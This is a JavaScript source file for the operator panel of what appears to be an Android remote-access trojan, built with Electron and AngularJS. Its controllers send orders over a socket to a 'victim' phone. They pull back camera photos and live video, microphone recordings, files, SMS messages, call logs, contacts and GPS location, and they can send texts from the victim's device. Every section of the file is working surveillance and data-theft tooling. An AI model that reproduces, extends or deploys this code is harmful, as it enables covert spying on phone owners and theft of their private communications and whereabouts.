const { ipcRenderer } = require('electron');
const { dialog, getCurrentWindow } = require('@electron/remote');
const app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
const fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const ORDER = CONSTANTS.order;
const os = require('os');
const path = require("path");

const dataPath = path.join(os.homedir(), CONSTANTS.dataDir);
const downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
const outputPath = path.join(dataPath, CONSTANTS.outputApkPath);

let socket = require('@electron/remote').getCurrentWebContents().victim;

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        });
});

//-----------------------LAB Controller (lab.html)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location, $timeout) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        $labCtrl.logs.push({
            date: new Date().toLocaleString(),
            msg: msg,
            color: fontColor
        });

        // Use $timeout to ensure the view is updated before scrolling
        $timeout(() => {
            if (log) {
                // use smooth scrolling for a lovely clean log output
                log.scrollTo({ top: log.scrollHeight, behavior: 'smooth' });
            }
        }, 0);

        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    };

    $labCtrl.clearLogs = () => {
        if ($labCtrl.logs.length !== 0) {
            $labCtrl.logs = [];
        }
    }

    // fired when notified from the Main Process (main.js) about termination of the Listener
    ipcRenderer.on('SocketIO:ListenerTerminated', () => {
        $rootScope.Log('[¡] The Listening Process was Terminated. Closing Victims Lab....', CONSTANTS.logStatus.INFO);
    });

    // event listener to handle individual victim disconnection in the lab child window
    ipcRenderer.on('SocketIO:DisconnectedVictim', () => {
        $rootScope.Log("[¡] The Session with this Client has been Terminated. Closing Victims Lab....", CONSTANTS.logStatus.INFO);
    });

    // event listener to handle dropped victims connections in the lab child window
    ipcRenderer.on('SocketIO:LostVictimConnection', () => {
        $rootScope.Log('[!] Victim Connection was Lost!', CONSTANTS.logStatus.FAIL);        
    });

    // to move from view to another
    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }

});

//-----------------------Camera Controller (camera.html)------------------------
// BEING WORKED ON //
app.controller("CamCtrl", function ($scope, $rootScope) {
    var $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.isLiveShown = false; // To track live preview state
    var camera = CONSTANTS.orders.camera;

    // Remove socket listener if the camera page is changed or destroyed
    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
    });

    $rootScope.Log("[i] Accessing the Victim's Available Cameras...", CONSTANTS.logStatus.INFO);
    $camCtrl.load = 'loading';

    // Request camera list from the server
    socket.emit(CONSTANTS.order, { order: camera, extra: 'camList' });

    // Handle incoming data
    socket.on(camera, (data) => {
        if (data.camList === true) { // Response is the camera list
            $rootScope.Log('[✓] Cameras List Arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[0]; // Default to the first camera
            $camCtrl.$apply();
        }

        if (data.image === true) { // Response is a picture
            $rootScope.Log('[✓] Picture Arrived', CONSTANTS.logStatus.SUCCESS);

            // Convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.isLiveShown = false; // Stop live preview if snapshot is taken
            $camCtrl.$apply();

            // Function to save the photo
            $camCtrl.savePhoto = () => {
                $rootScope.Log('[i] Saving Picture...', CONSTANTS.logStatus.INFO);
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, Buffer.from(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('[✓] Picture Saved at: ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('[x] Failed to Save the Snapped Photo to the Local Disk!', CONSTANTS.logStatus.FAIL);
                });
            }
        }

        if (data.preview === true) { // Response is a live preview frame
            $rootScope.Log('[✓] Live Preview Frame Arrived', CONSTANTS.logStatus.SUCCESS);

            // Convert binary to base64 for display
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
            $camCtrl.isSaveShown = false; // Hide save button during live preview
            $camCtrl.$apply();
        }
    });

    // Snap a picture
    $camCtrl.snap = () => {
        $rootScope.Log('[i] Snapping a picture...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: $camCtrl.selectedCam.id });
    }

    // Start live preview
    $camCtrl.startLivePreview = () => {
        $rootScope.Log('[i] Starting Live Preview...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: 'startLive' });
        $camCtrl.isLiveShown = true;
    }

    // Stop live preview
    $camCtrl.stopLivePreview = () => {
        $rootScope.Log('[i] Stopping Live Preview...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: 'stopLive' });
        $camCtrl.isLiveShown = false;
    }
});

//-----------------------File Controller (fileManager.html)------------------------
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = ''; // Initialize with an empty string
    $fmCtrl.files = [];
    $fmCtrl.externalRequestInProgress = false;
    $fmCtrl.sdCardRequestInProgress = false;

    $('.menu .item').tab();

    var fileManager = CONSTANTS.orders.fileManager;
    var externalStoragePathRequest = CONSTANTS.orders.externalStoragePathRequest;
    var sdCardPathRequest = CONSTANTS.orders.sdCardPathRequest;

    // Remove socket listeners on destroy
    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
        socket.removeAllListeners(externalStoragePathRequest);
        socket.removeAllListeners(sdCardPathRequest);
    });

    $fmCtrl.activateDefaultStorageTab = () => {
        $('.menu .item[data-tab="external"]').tab('change tab', 'external');
    }

    // Automatically activate external storage tab and request path
    angular.element(document).ready(function () {
        $fmCtrl.activateDefaultStorageTab();
        $fmCtrl.requestExternalStoragePath();
    });

    // Limit for infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    };

    // Request external storage path
    $fmCtrl.requestExternalStoragePath = () => {
        if (!$fmCtrl.externalRequestInProgress) {
            $fmCtrl.externalRequestInProgress = true;
            $fmCtrl.load = 'loading'; // Set to loading when requesting
            $rootScope.Log('[i] Accessing External Storage...', CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, {
                order: externalStoragePathRequest
            });
        }
    };

    // Handle response for external storage
    socket.on(externalStoragePathRequest, (data) => {
        $fmCtrl.externalRequestInProgress = false;
        var externalStoragePath = data.path;
        if (externalStoragePath) {
            //$rootScope.Log('[i] Retrieved external storage path: ' + externalStoragePath + '...');
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: externalStoragePath
            });
        } else {
            $rootScope.Log('[x] Unable to Access External Storage!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // Request SD card path
    $fmCtrl.requestSdCardPath = () => {
        if (!$fmCtrl.sdCardRequestInProgress) {
            $fmCtrl.sdCardRequestInProgress = true;
            $fmCtrl.load = 'loading'; // Set to loading when requesting
            $rootScope.Log('[i] Accessing Removable (SD Card) Storage...', CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, {
                order: sdCardPathRequest
            });
        }
    };

    // Handle response for SD card
    socket.on(sdCardPathRequest, (data) => {
        $fmCtrl.sdCardRequestInProgress = false;
        var sdCardStoragePath = data.path;
        if (sdCardStoragePath) {
            //$rootScope.Log('Received SD Card path: ' + sdCardStoragePath);
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: sdCardStoragePath
            });
        } else {
            $rootScope.Log('[x] Unable to Access Removable (SD Card) Storage!', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // Handle file responses
    socket.on(fileManager, (data) => {
        if (data.file == true) {
            $rootScope.Log('[i] Saving File...', CONSTANTS.logStatus.INFO);
            var filePath = path.join(downloadsPath, data.name);
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('[x] Failed to Save the Selected File to the Local Disk!', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('[✓] File Saved at: ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });
        } else if (data.length != 0) {
            $rootScope.Log('[✓] Files List Arrived.', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('[x] Access denied! Directory Unaccessible.', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    // Get files in directory
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading'; // Set to loading when fetching files
            $rootScope.Log('[i] Accessing ' + file, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, {
                order: fileManager,
                extra: 'ls',
                path: '/' + file
            });
        }
    };

    // Save file
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('[i] Downloading ' + '/' + file, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, {
            order: fileManager,
            extra: 'dl',
            path: '/' + file
        });
    };
});

//-----------------------SMS Controller (sms.html)------------------------
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.inboxSMSList = [];
    $SMSCtrl.sentSMSList = [];
    $('.menu .item').tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });

    // sets and activates the nested inbox SMS list tab when the main `SMS Lists` tab is clicked
    $SMSCtrl.activateDefaultTabSmsLists = () => {
        // Use jQuery to activate the Inbox tab
        $('.menu .item[data-tab="inboxSMSList"]').tab('change tab', 'inboxSMSList');
    };

    // Function to fetch SMS list based on type
    $SMSCtrl.fetchSMSList = (smsType) => {
        if (smsType === 'inbox') {
            $SMSCtrl.inboxLoading = 'loading';  // Use a separate loading state for Inbox
            $SMSCtrl.inboxBarLimit = 50;
            $rootScope.Log("[i] Accessing the Victim's Inbox SMS's..", CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: sms, extra: 'inbox' });
        } else if (smsType === 'sent') {
            $SMSCtrl.sentLoading = 'loading';  // Use a separate loading state for Sent
            $SMSCtrl.sentBarLimit = 50;
            $rootScope.Log("[i] Accessing the Victim's Outbox SMS's..", CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: sms, extra: 'outbox' });
        } else {
            $rootScope.Log("[x] Unknown SMS type:", smsType, CONSTANTS.logStatus.FAIL);
        }
    };

    // send request to victim to bring all inbox sms
    $SMSCtrl.getInboxSMSList = () => $SMSCtrl.fetchSMSList('inbox');

    // send request to victim to bring all sent sms
    $SMSCtrl.getSentSMSList = () => $SMSCtrl.fetchSMSList('sent');

    $SMSCtrl.increaseLimit = (listType) => {
        if (listType === 'inbox') {
            $SMSCtrl.inboxBarLimit += 50;
        } else if (listType === 'outbox') {
            $SMSCtrl.sentBarLimit += 50;
        } else {
            $rootScope.Log('Unknown SMS List type:', listType);
        }
    };

    // send request to victim to send an sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        if (!phoneNo && !msg) {
            $rootScope.Log("[x] Both the Phone Number Field and the Message Field are Empty!", CONSTANTS.logStatus.FAIL);
            $rootScope.Log("[i] Please Input a Phone Number and Text Message to Send.", CONSTANTS.logStatus.INFO);
            return;
        }
        if (!phoneNo) {
            $rootScope.Log('[x] The Phone Number Field is Empty!', CONSTANTS.logStatus.FAIL);
            $rootScope.Log("[i] Please Input a Phone Number.", CONSTANTS.logStatus.INFO);
            return;
        }
        if (!msg) {
            $rootScope.Log('[x] Message Field is Empty!', CONSTANTS.logStatus.FAIL);
            $rootScope.Log("[i] Please Input a Text Message to Send.", CONSTANTS.logStatus.INFO);
            return;
        }
        $rootScope.Log('[i] Sending SMS..', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save the list of retrieved inbox sms messages to a csv file
    $SMSCtrl.SaveInboxSMS = () => {
        if ($SMSCtrl.receivedList.length == 0) return;

        var inboxCsvRows = [];
        for (var i = 0; i < $SMSCtrl.receivedList.length; i++) {
            inboxCsvRows.push($SMSCtrl.receivedList[i].phoneNo + "," + $SMSCtrl.receivedList[i].msg);
        }

        var csvStr = inboxCsvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving the Victim's Inbox SMS List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Failed to Save the List of the Victim's Inbox Messages to the local Disk!", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Inbox SMS List Saved at: " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    // save the list of retrieved outbox sms messages to a csv file
    $SMSCtrl.SaveSentSMS = () => {
        if ($SMSCtrl.sentList.length == 0) return;

        var sentCsvRows = [];
        for (var i = 0; i < $SMSCtrl.sentList.length; i++) {
            sentCsvRows.push($SMSCtrl.sentList[i].phoneNo + "," + $SMSCtrl.sentList[i].msg);
        }

        var csvStr = sentCsvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving the Victim's Outbox SMS List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Failed to Save the List of the Victim's Outbox Messages to the local Disk!", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Outbox SMS List Saved at: " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    // listening for victim response
    socket.on(sms, (data) => {
        if (data.inboxSMSList) {
            $SMSCtrl.inboxLoading = '';  // Reset loading state for Inbox
            $rootScope.Log("[✓] The List of the Victim's Inbox Messages has Arrived.", CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.receivedList = data.inboxSMSList;
            $SMSCtrl.smsSize = data.inboxSMSList.length;
            $SMSCtrl.$apply();
        } else if (data.sentSMSList) {
            $SMSCtrl.sentLoading = '';  // Reset loading state for Sent
            $rootScope.Log("[✓] The List of the Victim's Outbox Messages has Arrived.", CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.sentList = data.sentSMSList;
            $SMSCtrl.smsSize = data.sentSMSList.length;
            $SMSCtrl.$apply();
        } else if (data) {
            $rootScope.Log('[✓] SMS sent.', CONSTANTS.logStatus.SUCCESS);
        } else {
            if (data.inboxSMSList === null) {
                $rootScope.Log("[x] Unable to Retrieve the Victim's Inbox SMS's!", CONSTANTS.logStatus.FAIL);
            } else if (data.sentSMSList === null) {
                $rootScope.Log("[x] Unable to Retrieve the Victim's Outbox SMS's!", CONSTANTS.logStatus.FAIL);
            } else if (data === null) {
                $rootScope.Log('[x] SMS Failed to Send!', CONSTANTS.logStatus.FAIL);
            } else {
                $rootScope.Log('[x] An unknown error occurred!', CONSTANTS.logStatus.FAIL);
            }
        }
    });
});


//-----------------------Calls Controller (callslogs.html)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log("[i] Accessing the Victim's Call Log...", CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving Calls List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Failed to Save " + csvPath + " Failed!", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Calls List Saved at: " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('[✓] Calls List Arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });

});

//-----------------------Contacts Controller (contacts.html)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log("[i] Accessing the Victim's Contacts list...", CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("[i] Saving Contacts List...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("[x] Failed to Save " + csvPath + " Failed!", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("[✓] Contacts List Saved at: " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('[✓] Contacts List Arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });

});

//-----------------------Mic Controller (mic.html)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds !== undefined && seconds !== null && seconds >= 0) {
            if (seconds > 0) {
                $rootScope.Log('[i] Recording ' + seconds + "'s...", CONSTANTS.logStatus.INFO);
                socket.emit(ORDER, { order: mic, sec: seconds });
            }
        } else {
            $rootScope.Log('[x] Seconds must be more than 0', CONSTANTS.logStatus.FAIL);
        }

    }

    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('[✓] Audio Arrived', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('[i] Saving file...', CONSTANTS.logStatus.INFO);
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('[x] Failed to Save Audio Recording to the Local Disk!', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('[✓] File Saved at: ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });

            };

        }

    });
});

//-----------------------Location Controller (location.html)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
    });

    var map = L.map('mapid').setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    $LocCtrl.Refresh = () => {

        $LocCtrl.load = 'loading';
        $rootScope.Log("[i] Accessing the Victim's Location...", CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: location });

    }

    $LocCtrl.load = 'loading';
    $rootScope.Log("[i] Accessing the Victim's Location...", CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: location });

    var marker;
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('[x] Try Refreshing.', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log("[✓] The Victim's Location has Arrived => " + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);
                if (!marker)
                    var marker = L.marker(victimLoc).addTo(map);
                else
                    marker.setLatLng(victimLoc).update();

                map.panTo(victimLoc);
            }
        } else
            $rootScope.Log("[x] The Location Service is not enabled on the Victim's Device", CONSTANTS.logStatus.FAIL);
    });

});